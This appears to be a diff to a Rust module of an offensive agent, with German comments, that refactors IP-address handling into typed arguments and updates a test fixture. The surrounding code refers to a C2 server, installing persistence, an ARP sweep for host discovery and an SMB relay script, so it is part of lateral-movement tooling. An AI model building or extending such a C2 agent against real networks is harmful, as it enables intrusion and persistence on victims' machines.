@@ -15,7 +15,6 @@
 //! C2-Port, der Schlüsselvorrat, die Umgebung, die Argumente. Damit lässt
 //! sich ein Lauf prüfen — ohne Server, ohne Netz und ohne Dateisystem.
 
-use std::net::Ipv4Addr;
 use std::path::PathBuf;
 
 use kx_core::c2::STATUS_AGENT;
@@ -169,8 +168,7 @@ impl<'a, U: Umgebung> Lauf<'a, U> {
     /// Sie ist stabiler als eine PID und zeigt auf einen Host, den der
     /// C2-Server kennt.
     fn host_kennung(&self) -> String {
-        let own_ip: Ipv4Addr = self.args.own_ip.parse().expect("Ungültige eigene IP");
-        own_ip.to_string()
+        self.args.own_ip.to_string()
     }
 
     /// Installiert die Persistenz mit der Invocation, die der Agent selbst
@@ -187,18 +185,17 @@ impl<'a, U: Umgebung> Lauf<'a, U> {
         if let Some(hosts) = &self.args.hosts {
             info!("Nutze vorgegebene Host-Liste");
             return hosts
-                .split(',')
-                .filter_map(|h| h.trim().parse::<Ipv4Addr>().ok())
+                .iter()
                 .map(|ip| DiscoveredHost {
                     mac: [0; 6],
-                    ip: ip.into(),
+                    ip: (*ip).into(),
                 })
                 .collect();
         }
 
-        let range_start: Ipv4Addr = self.args.start.parse().expect("Ungültige Start-IP");
-        let range_end: Ipv4Addr = self.args.end.parse().expect("Ungültige End-IP");
-        let own_ip: Ipv4Addr = self.args.own_ip.parse().expect("Ungültige eigene IP");
+        let range_start = self.args.start;
+        let range_end = self.args.end;
+        let own_ip = self.args.own_ip;
 
         // Die eigene MAC kommt vom Interface: der ARP-Sweep nennt sie als
         // Absender. Eine Anfrage von 00:00:00:00:00:00 beantwortet keine
@@ -387,12 +384,12 @@ mod tests {
             server: "https://127.0.0.1:8443".into(),
             token: crate::Secret::from("geheim"),
             iface: "eth0".into(),
-            start: "192.168.1.1".into(),
-            end: "192.168.1.10".into(),
-            own_ip: "192.168.1.100".into(),
+            start: "192.168.1.1".parse().unwrap(),
+            end: "192.168.1.10".parse().unwrap(),
+            own_ip: "192.168.1.100".parse().unwrap(),
             // Eine vorgegebene Host-Liste umgeht den ARP-Sweep — der Test
             // fasst das Netz nicht an.
-            hosts: Some("192.168.1.5".into()),
+            hosts: Some(vec!["192.168.1.5".parse().unwrap()]),
             relay_script: "assets/smbrelayx.py".into(),
             server_cert: "/tmp/kx-server.crt".into(),
             server_key: None,
